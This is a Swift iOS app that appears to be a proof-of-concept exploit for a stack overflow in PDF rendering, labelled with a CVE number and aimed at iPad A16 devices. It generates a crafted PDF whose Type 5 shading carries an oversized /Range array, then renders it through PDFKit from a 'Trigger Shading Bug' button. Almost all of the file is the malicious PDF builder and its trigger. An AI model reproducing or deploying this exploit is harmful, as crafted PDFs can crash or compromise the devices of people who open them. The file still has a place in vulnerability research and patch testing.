import SwiftUI
import PDFKit
import Foundation

// MARK: - CVE-2026-112611: Shading Type 5 Stack Overflow

func createShadingPDF() -> Data? {
    // Proper Type 5 shading with all required keys
    // /Range with 136 elements triggers the stack VLA overrun
    
    let rangeArray = "[0 1] " + String(repeating: "[0 1] ", count: 135)  // 136 total
    
    let pdfContent = """
    %PDF-1.4
    1 0 obj
    << /Type /Catalog /Pages 2 0 R >>
    endobj
    2 0 obj
    << /Type /Pages /Kids [3 0 R] /Count 1 >>
    endobj
    3 0 obj
    << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792]
       /Resources << /Shading << /Sh1 4 0 R >> >>
       /Contents 5 0 R >>
    endobj
    4 0 obj
    << /ShadingType 5
       /ColorSpace /DeviceRGB
       /BitsPerCoordinate 32
       /BitsPerComponent 8
       /BitsPerFlag 8
       /Decode [0 1 0 1 0 1]
       /Range \(rangeArray)
       /DataSource 6 0 R
       /Function << /FunctionType 2 /Domain [0 1] /C0 [0 0 0] /C1 [1 1 1] /N 1 >>
       /Length 0
    >>
    stream
    endstream
    endobj
    5 0 obj
    << /Length 20 >>
    stream
    /Sh1 sh
    endstream
    endobj
    6 0 obj
    << /Length 100 >>
    stream
    0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    endstream
    endobj
    xref
    0 7
    0000000000 65535 f 
    0000000009 00000 n 
    0000000058 00000 n 
    0000000115 00000 n 
    0000000273 00000 n 
    0000000500 00000 n 
    0000000560 00000 n 
    trailer
    << /Size 7 /Root 1 0 R >>
    startxref
    710
    %%EOF
    """
    
    return pdfContent.data(using: .utf8)
}

func triggerShadingBug() {
    print("[*] CVE-2026-112611: Shading Type 5 Stack Overflow")
    print("[*] Target: iPad A16 (no MTE)")
    
    guard let pdfData = createShadingPDF() else {
        print("[-] Failed to create PDF")
        return
    }
    
    print("[*] PDF created, size: \(pdfData.count) bytes")
    
    // Write to temp file for PDFKit
    let tempURL = FileManager.default.temporaryDirectory.appendingPathComponent("shading.pdf")
    do {
        try pdfData.write(to: tempURL)
        print("[*] PDF written to: \(tempURL.path)")
    } catch {
        print("[-] Failed to write PDF: \(error)")
        return
    }
    
    // Load with PDFDocument
    guard let document = PDFDocument(url: tempURL) else {
        print("[-] Failed to create PDF document")
        return
    }
    
    print("[*] PDF document created")
    print("[*] Pages: \(document.pageCount)")
    
    guard let page = document.page(at: 0) else {
        print("[-] No page found")
        return
    }
    
    print("[*] Page accessed, rendering...")
    print("[*] This should trigger the stack overflow...")
    
    // Render — this triggers the bug
    let bounds = page.bounds(for: .mediaBox)
    let format = UIGraphicsImageRendererFormat()
    format.scale = 1
    
    let renderer = UIGraphicsImageRenderer(size: bounds.size, format: format)
    
    _ = renderer.image { context in
        UIColor.white.set()
        context.fill(bounds)
        page.draw(with: .mediaBox, to: context.cgContext)
    }
    
    print("[*] Rendered without crash?")
}

// MARK: - App Entry Point

@main
struct ShadingTriggerApp: App {
    var body: some Scene {
        WindowGroup {
            ContentView()
        }
    }
}

struct ContentView: View {
    @State private var logOutput = ""
    @State private var isRunning = false
    
    var body: some View {
        VStack(spacing: 20) {
            Text("CVE-2026-112611")
                .font(.largeTitle)
                .bold()
            
            Text("Shading Type 5 Stack Overflow")
                .font(.headline)
            
            ScrollView {
                Text(logOutput)
                    .font(.system(.body, design: .monospaced))
                    .foregroundColor(.green)
                    .padding()
            }
            .frame(height: 300)
            .background(Color.black.opacity(0.8))
            .cornerRadius(10)
            
            Button(action: runExploit) {
                Text(isRunning ? "Running..." : "Trigger Shading Bug")
                    .font(.title2)
                    .bold()
                    .foregroundColor(.white)
                    .padding()
                    .background(isRunning ? Color.gray : Color.red)
                    .cornerRadius(10)
            }
            .disabled(isRunning)
        }
        .padding()
    }
    
    func runExploit() {
        isRunning = true
        logOutput = "[*] Starting shading exploit...\n"
        
        DispatchQueue.global(qos: .userInitiated).async {
            triggerShadingBug()
            
            DispatchQueue.main.async {
                logOutput += "[*] Complete\n"
                isRunning = false
            }
        }
    }
}
